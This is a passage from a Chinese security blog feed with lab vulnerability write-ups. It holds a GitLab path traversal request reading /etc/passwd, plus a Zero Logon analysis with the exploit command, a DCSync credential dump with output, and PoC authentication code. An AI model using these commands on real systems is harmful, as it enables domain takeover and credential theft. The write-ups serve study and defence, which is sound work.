&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">/personal_snippet|user/&lt;/span>, id: &lt;span style="color:#e6db74">/\d+/&lt;/span>, &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">%r{[^/]+}&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># show temporary uploads&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get &lt;span style="color:#e6db74">&amp;#39;-/system/temp/:secret/:filename&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;uploads#show&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">%r{[^/]+}&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Appearance&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get &lt;span style="color:#e6db74">&amp;#34;-/system/:model/:mounted_as/:id/:filename&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;uploads#show&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">/appearance/&lt;/span>, &lt;span style="color:#e6db74">mounted_as&lt;/span>: &lt;span style="color:#e6db74">/logo|header_logo|pwa_icon|favicon/&lt;/span>, &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">/.+/&lt;/span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">as&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;appearance_upload&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># create uploads for models, snippets (notes) available for now&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> post &lt;span style="color:#e6db74">&amp;#39;:model&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;uploads#create&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">/personal_snippet|user/&lt;/span>, id: &lt;span style="color:#e6db74">/\d+/&lt;/span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">as&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;upload&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> post &lt;span style="color:#e6db74">&amp;#39;:model/authorize&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;uploads#authorize&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">/personal_snippet|user/&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Alert Metric Images&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get &lt;span style="color:#e6db74">&amp;#34;-/system/:model/:mounted_as/:id/:filename&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;uploads#show&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">/alert_management_metric_image/&lt;/span>, &lt;span style="color:#e6db74">mounted_as&lt;/span>: &lt;span style="color:#e6db74">/file/&lt;/span>, &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">%r{[^/]+}&lt;/span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">as&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;alert_metric_image_upload&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Abuse Reports Images&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> get &lt;span style="color:#e6db74">&amp;#34;-/system/:model/:mounted_as/:id/:filename&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;uploads#show&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">model&lt;/span>: &lt;span style="color:#e6db74">/abuse_report/&lt;/span>, &lt;span style="color:#e6db74">mounted_as&lt;/span>: &lt;span style="color:#e6db74">/screenshot/&lt;/span>, &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">%r{[^/]+}&lt;/span> },
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">as&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;abuse_report_upload&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Redirect old note attachments path to new uploads path.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>get &lt;span style="color:#e6db74">&amp;#34;files/note/:id/:filename&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">to&lt;/span>: redirect(&lt;span style="color:#e6db74">&amp;#34;uploads/note/attachment/%{id}/%{filename}&amp;#34;&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">constraints&lt;/span>: { &lt;span style="color:#e6db74">filename&lt;/span>: &lt;span style="color:#e6db74">%r{[^/]+}&lt;/span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="坑点">坑点&lt;/h3>
&lt;p>&lt;strong>组层数不够&lt;/strong>&lt;/p>
&lt;p>原先按照官方通告说的至少5层组嵌套，就只新建了5层，而后发送payload，一直报400，一度以为环境是16.0.1修复版本，而后发现是嵌套不够。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ curl http://192.168.59.197/g1/g2/g3/g4/g5/p1/uploads/dec19360ec8b52993908879181719de3/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%20
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;400 Bad Request&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;hr&amp;gt;&amp;lt;center&amp;gt;nginx&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>后来得到同事提示，需要至少9层才可以访问到根目录。&lt;/p>
&lt;p>&lt;strong>穿越符不够&lt;/strong>&lt;/p>
&lt;p>经测试，至少需要12个穿越符&lt;code>../&lt;/code> 才能成功穿越到根目录&lt;/p>
&lt;p>&lt;strong>小结&lt;/strong>&lt;/p>
&lt;p>本次漏洞分析有点事后诸葛亮，从已知的PoC推测触发的文件路径，但总算成功理解了整个触发文件流，坑点就是nginx解析导致需要足够的group才能穿越到根目录，分析这个漏洞的时候没学过ruby，依靠ChatGPT才能够理解某些代码。&lt;/p>
&lt;p>&lt;strong>Created at 2023-05-26T10:36:20+08:00&lt;/strong>&lt;/p></description></item><item><title>Zero Logon 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</link><pubDate>Mon, 08 May 2023 14:39:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/zero-logon/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Netlogon协议认证过程：
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/zero-logon.zh-cn.assets/1.png" />&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>win server 2012&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>利用&lt;/strong>
域环境使用Windows server 2012R2搭建，先用
&lt;a href="https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py" target="_blank">脚本&lt;/a>重置域账户密码
&lt;code>python cve-2020-1472-exploit.py WIN2016 192.168.52.130&lt;/code>
并抓取数据包
重置之后域账户的密码为空，对应hash为&lt;code>31d6cfe0d16ae931b73c59d7e0c089c0&lt;/code>&lt;/p>
&lt;p>安装impacket：&lt;/p>
&lt;ul>
&lt;li>&lt;code>python3 -m pipx install impacket&lt;/code>&lt;/li>
&lt;li>&lt;code>pipx ensurepath&lt;/code>
使用&lt;code>impacket&lt;/code>的&lt;code>secretsdump&lt;/code>进行Dcsync，得到Administratr账户的NTLM hash&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>secretsdump.py cqy.io/WIN2016&lt;span style="color:#ae81ff">\$&lt;/span>@WIN2016 -dc-ip 192.168.52.130 -just-dc-user cqy&lt;span style="color:#ae81ff">\\&lt;/span>administrator -hashes 31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Impacket v0.10.0 - Copyright &lt;span style="color:#ae81ff">2022&lt;/span> SecureAuth Corporation
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Dumping Domain Credentials &lt;span style="color:#f92672">(&lt;/span>domain&lt;span style="color:#ae81ff">\u&lt;/span>id:rid:lmhash:nthash&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Using the DRSUAPI method to get NTDS.DIT secrets
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:668d503af91aefe071e37a16e885047b:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Kerberos keys grabbed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:aes256-cts-hmac-sha1-96:8996ffd41ae52dd62a3c60007d078f10eb7cd3eb5d4b74c90791c8e47eba88cb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:aes128-cts-hmac-sha1-96:a3a6d348e74cee613718c2f94d404fb6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:des-cbc-md5:f732d313b5e92585
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> Cleaning up...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>PoC分析&lt;/strong>
关键代码是下面这个函数，参数rpc_con是&lt;code>DCERPC_v5&lt;/code>对象，描述了rcp链接，&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">for&lt;/span> attempt &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">0&lt;/span>, MAX_ATTEMPTS):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        result &lt;span style="color:#f92672">=&lt;/span> try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">if&lt;/span> result &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            print(&lt;span style="color:#e6db74">&amp;#39;=&amp;#39;&lt;/span>, end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, flush&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">try_zero_authenticate&lt;/span>(rpc_con, dc_handle, dc_ip, target_computer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#75715e"># Connect to the DC&amp;#39;s Netlogon service.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#75715e"># Use an all-zero challenge and credential.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    plaintext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    ciphertext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#75715e"># Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    flags &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x212fffff&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#75715e"># Send challenge and authentication request.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    nrpc&lt;span style="color:#f92672">.&lt;/span>hNetrServerReqChallenge(rpc_con, dc_handle &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, target_computer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, plaintext)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        server_auth &lt;span style="color:#f92672">=&lt;/span> nrpc&lt;span style="color:#f92672">.&lt;/span>hNetrServerAuthenticate3(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            rpc_con, dc_handle &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, target_computer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;$&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, nrpc&lt;span style="color:#f92672">.&lt;/span>NETLOGON_SECURE_CHANNEL_TYPE&lt;span style="color:#f92672">.&lt;/span>ServerSecureChannel,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            target_computer &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, ciphertext, flags
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e"># It worked!&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">assert&lt;/span> server_auth[&lt;span style="color:#e6db74">&amp;#39;ErrorCode&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">except&lt;/span> nrpc&lt;span style="color:#f92672">.&lt;/span>DCERPCSessionError &lt;span style="color:#66d9ef">as&lt;/span> ex:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#75715e"># Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">if&lt;/span> ex&lt;span style="color:#f92672">.&lt;/span>get_error_code() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0xc0000022&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>            fail(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Unexpected error code from DC: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>ex&lt;span style="color:#f92672">.&lt;/span>get_error_code()&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">BaseException&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> ex:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>        fail(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Unexpected error: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>ex&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在PoC中循环发起认证，每次认证时，client challenge置为0x00 * 8，client credential置为0x00 * 8
在
&lt;a href="https://www.ch35tnut.site/zh-cn/research/protocol/netlogon/">netlogon协议&lt;/a>中知道，服务器会比较自己计算的ClientCredential和客户端发过来的ClientCredential是否相等，而ClientCredential来源于会话密钥加密ClientChallenge。其中加密算法为AES，使用CFB8模式。该算法过程如下：
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/zero-logon.zh-cn.assets/2.png" />
算法步骤：&lt;/p>
&lt;ol>
&lt;li>确定一个16字节的初始向量IV。&lt;/li>
&lt;li>将IV和明文组合,例如IV + 明文的前16个字节。&lt;/li>
&lt;li>对组合的数据块进行AES加密,输出一个16字节的密文块。&lt;/li>
&lt;li>从密文块的第一个字节,与明文的第一个字节进行异或,得到密文的第一个字节。&lt;/li>
&lt;li>密文的第一个字节与IV的第一个字节组合,形成一个新的16字节值。&lt;/li>
&lt;li>对这个新的值再次进行AES加密,得到下一个16字节密文块。&lt;/li>
&lt;li>从新密文块取第一个字节,与明文的下一个字节异或,生成密文的下一个字节。&lt;/li>
&lt;li>重复步骤5-7,直到所有明文都被加密。&lt;/li>
&lt;li>若明文不足16的倍数字节,剩余明文使用PKCS7Padding进行填充。&lt;/li>
&lt;/ol>
&lt;p>&lt;em>AES-CFB8通过前一个密文块的反馈来影响下一个明文块的加密,从而避免了ECB模式的确定性问题。但必须使用随机的IV来保证安全性。&lt;/em>&lt;/p>
&lt;p>会话密钥计算公式：KDF(ClientChallenge+ServerChallenge+secret)，在每一轮认证过程中，ServerChallenge都会变化，但Windows中实现的AES-CFB8使用的iv被设为16字节的0x00
攻击者可控ClientChallenge和ClientCredential，CLientChallenge对应于蓝色部分。由于轮认证时ServerChallenge都会改变且不会重复，所以每次计算出的会话密钥都不一样。当ClientChallenge置为0x00 * 8，当第一轮计算时，计算出的结果有1/256概率为0x00，而这个0x00又会作为下一轮输入添加到iv的第一个字节，即有1/256概率计算后的结果和计算前的值一样全为0x00，这样每一轮计算结果都是全为0x00。
这样第一轮计算后在算法中的输入为全0，加密密钥不变，第二轮计算时，结果依然会是0，这样最终算法结果输出会是全0。
由于每轮认证过程中会话密钥都不一样，所以每一轮认证过程时，AES-CFB8第一轮计算的结果都会不一样，结果最多有256种情况，最差的情况在第256轮时计算结果为0x00。&lt;/p>
&lt;p>当AES-CFB8加密结果刚刚好为全0时，客户端发送的ClientCredential也为全0，此时就可以通过服务端的校验，完成身份验证。&lt;/p>
&lt;p>可以编写一段简单的python代码模拟服务端加密过程&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography.hazmat.primitives.ciphers &lt;span style="color:#f92672">import&lt;/span> Cipher, algorithms, modes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> cryptography.hazmat.backends &lt;span style="color:#f92672">import&lt;/span> default_backend
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> secrets
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iv &lt;span style="color:#f92672">=&lt;/span> bytes([
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>])  &lt;span style="color:#75715e"># 16 byte IV&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>plaintext &lt;span style="color:#f92672">=&lt;/span> bytes([
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    &lt;span style="color:#ae81ff">0x00&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>])  &lt;span style="color:#75715e"># 8 byte plaintext&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">256&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>    key &lt;span style="color:#f92672">=&lt;/span> secrets&lt;span style="color:#f92672">.&lt;/span>token_bytes(&lt;span style="color:#ae81ff">16&lt;/span>)  &lt;span style="color:#75715e"># 8 byte key&lt;/span>
